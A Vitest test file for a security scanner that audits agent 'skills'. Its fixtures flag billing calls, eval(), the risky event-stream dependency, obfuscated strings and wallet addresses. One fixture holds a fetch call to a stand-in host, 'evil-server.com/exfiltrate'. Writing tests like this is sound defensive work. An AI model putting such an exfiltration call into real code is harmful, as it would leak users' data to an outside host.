import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdirSync, writeFileSync, rmSync, existsSync } from "fs";
import { join } from "path";
import { runSecurityScan } from "../src/auditors/openclaw/security-scan.js";

const TEST_DIR = join(process.cwd(), "__test_scan__");
const SKILLS_DIR = join(TEST_DIR, "skills");

function createSkill(name: string, files: Record<string, string>) {
  const dir = join(SKILLS_DIR, name);
  mkdirSync(dir, { recursive: true });
  for (const [filename, content] of Object.entries(files)) {
    const filePath = join(dir, filename);
    mkdirSync(join(filePath, ".."), { recursive: true });
    writeFileSync(filePath, content);
  }
}

beforeEach(() => {
  mkdirSync(SKILLS_DIR, { recursive: true });
});

afterEach(() => {
  if (existsSync(TEST_DIR)) {
    rmSync(TEST_DIR, { recursive: true, force: true });
  }
});

describe("security scanner", () => {
  it("scores a clean skill as clean", async () => {
    createSkill("good-skill", {
      "SKILL.md": "# Good Skill\nDoes nothing suspicious.",
      "index.ts": 'console.log("hello");',
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const scoreResult = results.find((r) => r.check.includes("good-skill"));
    expect(scoreResult).toBeDefined();
    expect(scoreResult!.status).toBe("pass");
  });

  it("detects billing integrations as dangerous", async () => {
    createSkill("billing-skill", {
      "SKILL.md": "# Billing Skill",
      "billing.py": `
import urllib.request
def charge(uid, amount=0.001):
    return _post("/billing/charge", {"user_id": uid, "amount": amount})
`,
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const scoreResult = results.find(
      (r) => r.check.includes("billing-skill") && !r.check.includes(":")
    );
    expect(scoreResult).toBeDefined();
    expect(scoreResult!.status).toBe("fail");
  });

  it("detects eval() as suspicious", async () => {
    createSkill("eval-skill", {
      "index.js": 'const result = eval("1+1");',
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const highSev = results.find(
      (r) => r.check.includes("eval-skill") && r.check.includes("high-severity")
    );
    expect(highSev).toBeDefined();
  });

  it("detects risky npm dependencies", async () => {
    createSkill("risky-deps", {
      "package.json": JSON.stringify({
        dependencies: { "event-stream": "^4.0.0", chalk: "^5.0.0" },
      }),
      "index.js": "// nothing suspicious in code",
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const depResult = results.find(
      (r) => r.check.includes("risky-deps") && r.check.includes("risky dependencies")
    );
    expect(depResult).toBeDefined();
    expect(depResult!.status).toBe("fail");
    expect(depResult!.message).toContain("event-stream");
  });

  it("extracts external URLs", async () => {
    createSkill("url-skill", {
      "index.ts": `
fetch("https://evil-server.com/exfiltrate");
fetch("https://api.openai.com/v1/chat"); // safe
`,
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const urlResult = results.find(
      (r) => r.check.includes("url-skill") && r.check.includes("external URLs")
    );
    expect(urlResult).toBeDefined();
    expect(urlResult!.message).toContain("evil-server.com");
  });

  it("detects obfuscated code", async () => {
    createSkill("obfuscated", {
      "index.js": String.raw`const x = "\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21\x21";`,
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const hitResult = results.find(
      (r) => r.check.includes("obfuscated") && r.check.includes("high-severity")
    );
    expect(hitResult).toBeDefined();
  });

  it("identifies ClawHub provenance", async () => {
    createSkill("clawhub-skill", {
      "SKILL.md": "# ClawHub Skill",
      ".clawhub/origin.json": '{"source": "clawhub"}',
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const result = results.find((r) => r.check.includes("clawhub-skill"));
    expect(result).toBeDefined();
    expect(result!.check).toContain("[ClawHub]");
  });

  it("identifies local provenance", async () => {
    createSkill("local-skill", {
      "SKILL.md": "# Local Skill",
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const result = results.find((r) => r.check.includes("local-skill"));
    expect(result).toBeDefined();
    expect(result!.check).toContain("[local]");
  });

  it("produces a summary with counts", async () => {
    // Clean slate — remove and recreate
    if (existsSync(TEST_DIR)) rmSync(TEST_DIR, { recursive: true, force: true });
    mkdirSync(SKILLS_DIR, { recursive: true });

    createSkill("summary-clean-one", { "index.ts": "// clean" });
    createSkill("summary-clean-two", { "index.ts": "// also clean" });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const summary = results.find((r) => r.check === "Scan complete");
    expect(summary).toBeDefined();
    // At least our 2 skills are in the count (hooks/extensions may add more)
    expect(summary!.message).toMatch(/\d+ scanned/);
    expect(summary!.message).toContain("clean");
  });

  it("detects cryptocurrency wallet addresses", async () => {
    createSkill("crypto-skill", {
      "index.ts": 'const wallet = "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28";',
    });

    const results = await runSecurityScan({
      config: "nonexistent",
      workspace: TEST_DIR,
    });

    const hitResult = results.find(
      (r) => r.check.includes("crypto-skill") && r.check.includes("high-severity")
    );
    expect(hitResult).toBeDefined();
  });
});
